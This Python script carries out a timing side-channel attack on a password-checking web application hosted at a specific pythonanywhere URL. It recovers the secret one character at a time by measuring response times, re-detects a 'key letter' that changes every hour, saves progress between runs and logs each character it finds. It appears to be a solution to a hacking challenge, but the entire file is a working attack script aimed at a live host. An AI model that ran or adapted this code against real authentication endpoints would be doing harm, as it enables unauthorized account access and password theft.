import statistics
import requests
import time
from datetime import datetime
from hackit_functions import *

URL = "https://barfishilev.pythonanywhere.com/"
REPEAT_CHECK = 8
POOL = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
# Alternative smaller pool for testing:
# POOL = 'aopqsAPTU16790'
PADDING_LENGTH = 12
MAX_PASSWORD_LENGTH = 6

last_day = -1
last_hour = -1
current_letter = ''


def find_cur_letter(url, pool, padding_length):
    """
    Finds the current key letter by measuring response times of every char
    in the pool. The char with the lowest response time is the key letter.
    If no char shows a significant time difference, the 4 lowest are retested.
    
    :param url: (str) The base URL to test.
    :param pool: (str) The pool of characters to test.
    :param padding_length: (int) The length of the padding to use.
    :return: (char) The current key letter.
    """
    wrong_time = timeit(url + '*' * padding_length, REPEAT_CHECK)
    timings = {}
    for ch in pool:
        last_key_letter = current_letter
        check_hour_change()
        if last_key_letter != current_letter:
            return current_letter
        
        test_url = url + ch * padding_length
        t = timeit(test_url, REPEAT_CHECK)
        timings[ch] = t
        log_save(f'KEY: {ch} | TIME: {t}', 'bar')
        if wrong_time - t > 0.4:
            log_save('=========================\n' \
                     f'KEY FOUND: {ch}\n' \
                     '=========================', 'bar')
            return ch

    sorted_timings = sorted(timings.items(), key=lambda x: x[1])
    lowest_time_chars = {}
    log_save('=========================\n' \
             'Checking 4 lowest keys...', 'bar')
    for i in range(4):
        last_key_letter = current_letter
        check_hour_change()
        if last_key_letter != current_letter:
            return current_letter
        
        test_url = url + sorted_timings[i][0] * padding_length
        t = timeit(test_url, REPEAT_CHECK + 5)
        lowest_time_chars[sorted_timings[i][0]] = t
        log_save(f'KEY: {sorted_timings[i][0]} | TIME: {t}', 'bar')
    
    sorted_timings = sorted(lowest_time_chars.items(), key=lambda x: x[1])
    log_save('=========================\n' \
             f'KEY FOUND: {sorted_timings[0][0]}' \
             '\n=========================', 'bar')
    return sorted_timings[0][0]


def check_hour_change():
    """
    Checks if the hour has changed, if it did, it finds the new key letter.
    """
    global last_day, last_hour, current_letter

    now = datetime.now()

    if now.minute >= 58:
        log_save(f"Hour will change in ~2 minutes. Waiting...", 'bar')
        time.sleep(120)
        now = datetime.now()

    day = now.day
    hour = now.hour

    if hour != last_hour or day != last_day:
        last_day = day
        last_hour = hour

        log_save('=========================\n' \
                 'Hour/Day changed, finding new key letter...', 'bar')
        current_letter = find_cur_letter(URL, POOL, PADDING_LENGTH)


def hack_password(url, pool, max_length, padding_length):
    """
    Hacks the password by finding the key letter and then finding each character
    one by one using timing attacks, by replacing the key letter at the current position
    with each character from the pool.
    If there is no significant timing difference for a character, 
    it retests the 4 lowest candidates.
    If the hour changes during the process, it updates the key letter.
    
    :param url: (str) The base URL to test.
    :param pool: (str) The pool of characters to test.
    :param max_length: (int) The maximum length of the password.
    :param padding_length: (int) The length of the padding to use.
    :return: (str) The hacked password.
    """
    password = []
    possible_chars = ' ' + pool
    
    progress = load_progress('bar')
    for ch in progress:
        password.append(ch)
    log_save(f'LOADED PROGRESS: {"".join(password).strip()}', 'bar')

    for i in range(len(progress), max_length):
        timings = {}

        check_hour_change()
        test_wrong_pass = [current_letter] * padding_length
        test_wrong_pass[i + max_length] = '*'
        test_wrong_url = url + ''.join(test_wrong_pass)
        wrong_time = timeit(test_wrong_url, REPEAT_CHECK)

        for ch in possible_chars:
            check_hour_change()

            test_pass = [current_letter] * padding_length
            test_pass[i + max_length] = ch
            test_url = url + ''.join(test_pass)
            t = timeit(test_url, REPEAT_CHECK)
            log_save(f'POS: {i} | CHAR: {ch} | TIME: {t}', 'bar')
                
            if wrong_time - t > 0.2 and ch != current_letter:
                password.append(ch)
                log_save('=============================\n' \
                         f'CHAR FOUND: {ch} | AT POS {i}\n' \
                         f'CURRENT PASSWORD: {"".join(password).strip()}\n' \
                         '=============================', 'bar')
                save_progress(ch, 'bar')
                break

            timings[ch] = t

        else:
            sorted_timings = sorted(timings.items(), key=lambda x: x[1])
            lowest_time_chars = {}
            log_save('=============================\n' \
                     'Checking 4 lowest chars...', 'bar')
            for j in range(4):
                check_hour_change()

                test_pass = [current_letter] * padding_length
                test_pass[i + max_length] = sorted_timings[j][0]
                test_url = url + ''.join(test_pass)
                t = timeit(test_url, REPEAT_CHECK + 5)
                lowest_time_chars[sorted_timings[j][0]] = t
                log_save(f'CHAR: {sorted_timings[j][0]} | TIME: {t}', 'bar')
            
            sorted_lowest = sorted(lowest_time_chars.items(), key=lambda x: x[1])
            password.append(sorted_lowest[0][0])
            log_save('=============================\n' \
                     f'CHAR FOUND: {sorted_lowest[0][0]} | AT POS {i}\n' \
                     f'CURRENT PASSWORD: {"".join(password).strip()}\n' \
                     '=============================', 'bar')
            save_progress(sorted_lowest[0][0], 'bar')
    
    secret_password = ''.join(password).strip()
    log_save('===========================================\n' \
             'HACKING COMPLETE!\n' \
             f'SECRET PASSWORD FOUND: {secret_password}\n' \
             f'URL: {URL}{secret_password}\n' \
             '===========================================', 'bar')
    
    log_save(f'IS CORRECT: {check_password(URL, secret_password)}', 'bar')
    return secret_password


if __name__ == '__main__':
    secret_password = hack_password(URL, POOL, MAX_PASSWORD_LENGTH, PADDING_LENGTH)
    print(secret_password)
